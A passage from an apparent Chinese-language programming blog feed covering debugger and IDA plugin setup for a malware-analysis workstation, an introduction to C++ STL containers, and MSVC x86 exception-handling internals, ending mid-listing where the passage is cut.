x64dbg添加trace功能</h4><p>思路：既然windbg可以使用这个功能，x64dbg只需要改自己的这一部分代码来调用windbg的接口即可。分析windbg命令发包代码，格式如下：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005204011991.png" alt="msg封装"></p><p>x64dbg中没有bc这个命令，参考其他命令实现来自己添加一个。首先是命令处理函数声明：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005204204302.png" alt="函数声明"></p><p>为了方便使用，也注册一个help来告诉使用方法：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005204423469.png" alt="注册help"></p><p>在初始化函数中添加注册项：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005204817236.png" alt="init注册"></p><p>在关闭函数中注册销毁项：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005204932046.png" alt="stop注册"></p><p>实现一下初始化函数：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005205129438.png" alt="init实现"></p><p>发包函数实现如下：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005233154515.png" alt="发包函数"></p><p>效果如下：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005233453603.png" alt="x64dbg效果"></p><h4 id="7-2-3-配置与使用"><a href="#7-2-3-配置与使用" class="headerlink" title="7.2.3 配置与使用"></a>7.2.3 配置与使用</h4><h5 id="Windbg-Preview："><a href="#Windbg-Preview：" class="headerlink" title="Windbg Preview："></a>Windbg Preview：</h5><p>插件目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\用户名\AppData\Local\Microsoft\WindowsApps<br></code></pre></td></tr></table></figure><p>指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">.load <span class="hljs-built_in">sync</span>// 加载64位插件<br>.load sync32// 加载32位插件<br><br>!<span class="hljs-built_in">sync</span>     // 开启同步<br><br>!bc on     // 开启trace<br>!bc off        // 关闭trace<br>!bc cls    // 清空屏幕中函数<br></code></pre></td></tr></table></figure><h5 id="x64dbg："><a href="#x64dbg：" class="headerlink" title="x64dbg："></a>x64dbg：</h5><p>指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-built_in">sync</span>// 开启同步<br><br>!syncbc on// 开启trace<br>!syncbc off// 关闭trace<br>!syncbc cls// 清空屏幕中函数<br></code></pre></td></tr></table></figure><p><strong>远程调试：</strong></p><p>需要在idb所在的目录新建文件 .sync，内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[INTERFACE]</span><br><span class="hljs-attr">host</span> = 分析机ip<br><span class="hljs-attr">port</span> = 监听端口<br></code></pre></td></tr></table></figure><p>同时将配置文件拷贝到调试机的C:\Users\用户名\目录下，在使用过程中ida需要一直开着插件窗口。</p><h3 id="7-3-Flare-Capa-Explorer"><a href="#7-3-Flare-Capa-Explorer" class="headerlink" title="7.3 Flare Capa Explorer"></a>7.3 Flare Capa Explorer</h3><h4 id="7-3-1-安装"><a href="#7-3-1-安装" class="headerlink" title="7.3.1 安装"></a>7.3.1 安装</h4><p><strong>注：IDA安装目录下的 idapyswitch.exe 可以切换IDA Python版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">// ida 7.7<br>pip install wheel<br>python -m pip install git+https://github.com/mandiant/capa<br><br>git <span class="hljs-built_in">clone</span> http://github.com/mandiant/capa.git.<br>git <span class="hljs-built_in">clone</span> https://github.com/mandiant/capa-rules.git<br><br><span class="hljs-built_in">cp</span> capa\capa\ida\plugin\capa_explorer.py IDA Pro7.7\plugins<br></code></pre></td></tr></table></figure><h4 id="7-3-2-使用"><a href="#7-3-2-使用" class="headerlink" title="7.3.2 使用"></a>7.3.2 使用</h4><p>Edit -&gt; Plugin -&gt; Flare capa explorer窗口下点击Analyze，选择rules文件夹进行分析。</p><p><strong>注：时不时的更新一下rules</strong></p><h3 id="7-4-ApplyCalleType-and-StructTyper-plugins"><a href="#7-4-ApplyCalleType-and-StructTyper-plugins" class="headerlink" title="7.4 ApplyCalleType and StructTyper plugins"></a>7.4 ApplyCalleType and StructTyper plugins</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/mandiant/flare-ida<br></code></pre></td></tr></table></figure><h3 id="7-5-Findcrypt-yara"><a href="#7-5-Findcrypt-yara" class="headerlink" title="7.5 Findcrypt-yara"></a>7.5 Findcrypt-yara</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install yara-python<br>git <span class="hljs-built_in">clone</span> https://github.com/polymorf/findcrypt-yara.git<br>copy both findcrypt3.py and findcrypt3.rule to IDA’s plugin folder (C:\Program Files\IDA Pro<br>7.7\plugins)<br></code></pre></td></tr></table></figure><h3 id="7-6-HashDB"><a href="#7-6-HashDB" class="headerlink" title="7.6 HashDB"></a>7.6 HashDB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/OALabs/hashdb-ida<br>copy hashdb.py to IDA’s plugin directory (C:\Program Files\IDA Pro 7.7\plugins)<br>Attention: as HashDB performs lookup on OALabs server, so you should remember to keep Internet access <span class="hljs-keyword">in</span> your environment<br></code></pre></td></tr></table></figure><p>- </p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> malware analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ STL partI</title>
      <link href="/2022/10/03/c-stl-parti/"/>
      <url>/2022/10/03/c-stl-parti/</url>
      
        <content type="html"><![CDATA[<h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1.基础概念"></a>1.基础概念</h2><p>STL 标准模板库 | 泛型编程思想</p><p><strong>参考：</strong></p><ul><li><p><a href="https://cplusplus.com/">C++</a></p></li><li><p><a href="https://en.cppreference.com/w/">C++Reference</a></p></li></ul><h2 id="2-六大部件"><a href="#2-六大部件" class="headerlink" title="2.六大部件"></a>2.六大部件</h2><ul><li>容器 Containers</li><li>分配器         Allocators</li><li>算法             Algorithms</li><li>迭代器         Iterators</li><li>适配器         Adapters</li><li>仿函数         Functors</li></ul><p>结构图如下：</p><p><img src="/2022/10/03/c-stl-parti/image-20221003221715050.png" alt="六大部件关系图"></p><p><strong>示范代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> ia[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br>vector&lt;<span class="hljs-type">int</span>, allocator&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">vi</span>(ia, ia + <span class="hljs-number">6</span>);<br><br>cout &lt;&lt; <span class="hljs-built_in">count_if</span>(vi.<span class="hljs-built_in">begin</span>(), vi.<span class="hljs-built_in">end</span>(), <br>                     <span class="hljs-built_in">not1</span>(<span class="hljs-built_in">bind2nd</span>(<span class="hljs-built_in">less</span>&lt;<span class="hljs-type">int</span>&gt;(), <span class="hljs-number">3</span>))) &lt;&lt; endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>容器遍历：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = vec.<span class="hljs-built_in">begin</span>(); i != vec.<span class="hljs-built_in">end</span>(); i++)<br>&#123;<br>    cout &lt;&lt; *i &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : &#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13</span>&#125;)<br>&#123;<br>cout &lt;&lt; i &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> elem : vec)<br>&#123;<br>cout &lt;&lt; elem &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; elem : vec)<br>&#123;<br>elem++;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-各种容器"><a href="#3-各种容器" class="headerlink" title="3.各种容器"></a>3.各种容器</h2><h3 id="3-1-顺序容器"><a href="#3-1-顺序容器" class="headerlink" title="3.1 顺序容器"></a>3.1 顺序容器</h3><table><thead><tr><th>名字</th><th>实现</th><th>特点</th></tr></thead><tbody><tr><td>vector</td><td>顺序存储</td><td>可变长数组，仅支持尾插</td></tr><tr><td>stack</td><td>顺序存储</td><td>栈，先进后出，仅一端压入弹出</td></tr><tr><td>deque</td><td>顺序存储</td><td>队列，先进先出，双端压入弹出</td></tr><tr><td>list</td><td>链式存储</td><td>双向链表，双端插入移除</td></tr><tr><td>forward_list</td><td>链式存储</td><td>单向链表，头部插入移除</td></tr></tbody></table><h3 id="3-2-关联容器"><a href="#3-2-关联容器" class="headerlink" title="3.2 关联容器"></a>3.2 关联容器</h3><table><thead><tr><th>名字</th><th>实现</th><th>用法</th><th>特点</th></tr></thead><tbody><tr><td>unordered_set</td><td>hash_table</td><td>unordered_set<key> us;</key></td><td>不支持重复，查询速度快</td></tr><tr><td>unprdered_map</td><td>hash_table</td><td>unprdered_map&lt;key, value&gt; um;</td><td>不支持重复，查询速度快</td></tr><tr><td>unordered_multiset</td><td>hash_table</td><td>unordered_multiset<key> ums;</key></td><td>支持重复，查询速度快</td></tr><tr><td>unprdered_multimap</td><td>hash_table</td><td>unprdered_multimap&lt;key, value&gt; umm;</td><td>支持重复，查询速度快</td></tr><tr><td>set</td><td>rb_tree</td><td>set<key> s;</key></td><td>不支持重复，有序，节省空间</td></tr><tr><td>map</td><td>rb_tree</td><td>map&lt;key, value&gt; m;</td><td>不支持重复，有序，节省空间</td></tr><tr><td>multiset</td><td>rb_tree</td><td>multiset<key> ms;</key></td><td>支持重复，有序，节省空间</td></tr><tr><td>multimap</td><td>rb_tree</td><td>multimap&lt;key, value&gt; mm;</td><td>支持重复，有序，节省空间</td></tr></tbody></table><p><strong>注：hash_table实现的容器需要重载 &#x3D;&#x3D; 运算符，而rb_tree实现的容器需要重载 &lt; 运算符。</strong></p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++异常处理</title>
      <link href="/2022/10/02/c-yi-chang-chu-li/"/>
      <url>/2022/10/02/c-yi-chang-chu-li/</url>
      
        <content type="html"><![CDATA[<h2 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h2><p>try：可能出现异常的代码，使用throw抛出指定类型的异常。</p><p>throw：抛出异常语句。</p><p>catch：捕获指定类型的异常，并尝试做出处理。可以定义多个用于捕获各种类型的异常。</p><p><strong>基本类型异常</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">division</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Division by zero condition.&quot;</span>;<span class="hljs-comment">// 抛出const char* 类型异常</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> a / b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">try</span><br>&#123;<br>std::cout &lt;&lt; <span class="hljs-built_in">division</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)<br>&#123;<br>std::cout &lt;&lt; msg &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-built_in">catch</span> (...)<br>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;exception catched.&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>C++标准异常</strong></p><p><img src="/2022/10/02/c-yi-chang-chu-li/image-20221002161750871.png" alt="C++标准异常继承树"></p><p><strong>自定义异常</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyException</span> : <span class="hljs-keyword">public</span> std::exception<span class="hljs-comment">// 继承自标准异常</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-title">what</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span><span class="hljs-comment">// throw()表示该函数不抛出任何异常</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;MyException.&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">try</span><br>&#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-built_in">MyException</span>();<br>&#125;<br><span class="hljs-built_in">catch</span> (MyException&amp; e)<br>&#123;<br>std::cout &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-built_in">catch</span> (std::exception&amp; e)<span class="hljs-comment">// 捕获C++标准异常</span><br>&#123;<br>std::cout &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-x86异常处理"><a href="#2-x86异常处理" class="headerlink" title="2.x86异常处理"></a>2.x86异常处理</h2><h3 id="2-1-异常栈帧结构图"><a href="#2-1-异常栈帧结构图" class="headerlink" title="2.1 异常栈帧结构图"></a>2.1 异常栈帧结构图</h3><p><img src="/2022/10/02/c-yi-chang-chu-li/igor1_cpp_eh_stack_layout.gif" alt="栈帧结构图"></p><h3 id="2-2-结构定义"><a href="#2-2-结构定义" class="headerlink" title="2.2 结构定义"></a>2.2 结构定义</h3><h4 id="2-2-1-FuncInfo"><a href="#2-2-1-FuncInfo" class="headerlink" title="2.2.1 FuncInfo"></a>2.2.1 FuncInfo</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 函数信息结构</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">FuncInfo</span> &#123;<br>    <span class="hljs-comment">// 编译器版本号</span><br>    <span class="hljs-comment">// 0x19930520: up to VC6, 0x19930521: VC7.x(2002-2003), 0x19930522: VC8 (2005)</span><br>    DWORD magicNumber;<br><br>    <span class="hljs-comment">// 最大栈展开数的下标</span><br>    <span class="hljs-type">int</span> maxState;<br><br>    <span class="hljs-comment">// 栈展开结构数组指针</span><br>    UnwindMapEntry* pUnwindMap;<br><br>    <span class="hljs-comment">// 函数中try块个数</span><br>    DWORD nTryBlocks;<br><br>    <span class="hljs-comment">// try块结构数组指针</span><br>    TryBlockMapEntry* pTryBlockMap;<br><br>    <span class="hljs-comment">// x86未使用</span><br>    DWORD nIPMapEntries;<br><br>    <span class="hljs-comment">// x86未使用</span><br>    <span class="hljs-type">void</span>* pIPtoStateMap;<br><br>    <span class="hljs-comment">// VC7+ only, expected exceptions list (function &quot;throw&quot; specifier) </span><br>    ESTypeList* pESTypeList;<br><br>    <span class="hljs-comment">// VC8+ only, bit 0 set if function was compiled with /EHs</span><br>    <span class="hljs-type">int</span> EHFlags;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-2-2-UnwindMapEntry"><a href="#2-2-2-UnwindMapEntry" class="headerlink" title="2.2.2 UnwindMapEntry"></a>2.2.2 UnwindMapEntry</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 栈展开信息结构</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">UnwindMapEntry</span> &#123;<br>    <span class="hljs-type">int</span> toState;        <span class="hljs-comment">// 栈展开下标数</span><br>    <span class="hljs-built_in">void</span> (*action)();   <span class="hljs-comment">// 展开执行函数地址</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-2-3-TryBlockMapEntry"><a href="#2-2-3-TryBlockMapEntry" class="headerlink" title="2.2.3 TryBlockMapEntry"></a>2.2.3 TryBlockMapEntry</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// try块结构</span><br><span class="hljs-comment">// 用于判断异常产生在哪个try块中</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TryBlockMapEntry</span> &#123;<br>    <span class="hljs-type">int</span> tryLow;<span class="hljs-comment">// try块最小状态索引，范围检查</span><br>    <span class="hljs-type">int</span> tryHigh;    <span class="hljs-comment">// try块最大状态索引，范围检查</span><br>    <span class="hljs-type">int</span> catchHigh;  <span class="hljs-comment">// catch块的最高状态索引，范围检查</span><br>    <span class="hljs-type">int</span> nCatches;   <span class="hljs-comment">// catch块个数</span><br>    HandlerType* pHandlerArray; <span class="hljs-comment">//catch块描述数组指针</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-2-4-HandlerType"><a href="#2-2-4-HandlerType" class="headerlink" title="2.2.4 HandlerType"></a>2.2.4 HandlerType</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// catch块结构</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">HandlerType</span> &#123;<br>  <span class="hljs-comment">// 0x01: const, 0x02: volatile, 0x08: reference</span><br>  DWORD adjectives;<br><br>  <span class="hljs-comment">// catch块要捕获的RTTI类型指针</span><br>  TypeDescriptor* pType;<br><br>  <span class="hljs-comment">// 异常对象在当前ebp中的偏移位置</span><br>  <span class="hljs-type">int</span> dispCatchObj;<br><br>  <span class="hljs-comment">// address of the catch handler code.</span><br>  <span class="hljs-comment">// returns address where to continues execution (i.e. code after the try block)</span><br>  <span class="hljs-comment">// catch处理代码地址</span><br>  <span class="hljs-type">void</span>* addressOfHandler;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-2-5-ESTypeList"><a href="#2-2-5-ESTypeList" class="headerlink" title="2.2.5 ESTypeList"></a>2.2.5 ESTypeList</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 实现了但是msvc默认不开启，可以使用 /d1Esrt 开启</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ESTypeList</span> &#123;<br><span class="hljs-comment">// 类型数组的数量</span><br><span class="hljs-type">int</span> nCount;<br><br><span class="hljs-comment">// list of exceptions; it seems only pType field in HandlerType is used</span><br>HandlerType* pTypeArray;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-2-6-TypeDescriptor"><a href="#2-2-6-TypeDescriptor" class="headerlink" title="2.2.6 TypeDescriptor"></a>2.2.6 TypeDescriptor</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TypeDescriptor</span> &#123;<br>  <span class="hljs-comment">// type_info类的虚表</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">void</span> * pVFTable;<br><br>  <span class="hljs-comment">// used to keep the demangled name returned by type_info::name()</span><br>  <span class="hljs-comment">// type_info::name()得到的名字</span><br>  <span class="hljs-type">void</span>* spare;<br><br>  <span class="hljs-comment">// mangled type name, e.g. &quot;.H&quot; = &quot;int&quot;, &quot;.?AUA@@&quot; = &quot;struct A&quot;, &quot;.?AVA@@&quot; = &quot;class A&quot;</span><br>  <span class="hljs-type">char</span> name[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2-3-throw结构定义"><a href="#2-3-throw结构定义" class="headerlink" title="2.3 throw结构定义"></a>2.3 throw结构定义</h3><h4 id="2-3-1-ThrowInfo"><a href="#2-3-1-ThrowInfo" class="headerlink" title="2.3.1 ThrowInfo"></a>2.3.1 ThrowInfo</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ThrowInfo</span> &#123;<br>      <span class="hljs-comment">// 0x01: const, 0x02: volatile</span><br>      DWORD attributes;<br><br>      <span class="hljs-comment">// 抛出异常对象的析构函数地址</span><br>      <span class="hljs-built_in">void</span> (*pmfnUnwind)();<br><br>      <span class="hljs-comment">// forward compatibility handler</span><br>      <span class="hljs-built_in">int</span> (*pForwardCompat)();<br><br>      <span class="hljs-comment">// catch块类型结构数组指针</span><br>      CatchableTypeArray* pCatchableTypeArray;<br>    &#125;;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">CatchableTypeArray</span> &#123;<br>      <span class="hljs-comment">// number of entries in the following array</span><br>      <span class="hljs-type">int</span> nCatchableTypes; <br>      CatchableType* arrayOfCatchableTypes[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-3-2-CatchableTypeArray"><a href="#2-3-2-CatchableTypeArray" class="headerlink" title="2.3.2 CatchableTypeArray"></a>2.3.2 CatchableTypeArray</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">CatchableTypeArray</span> &#123;<br>    <span class="hljs-comment">// 下面数组元素个数</span><br>    <span class="hljs-type">int</span> nCatchableTypes; <br>    <span class="hljs-comment">// catch类型信息</span><br>    CatchableType* arrayOfCatchableTypes[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2-3-3-CatchableType"><a href="#2-3-3-CatchableType" class="headerlink" title="2.3.3 CatchableType"></a>2.3.3 CatchableType</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 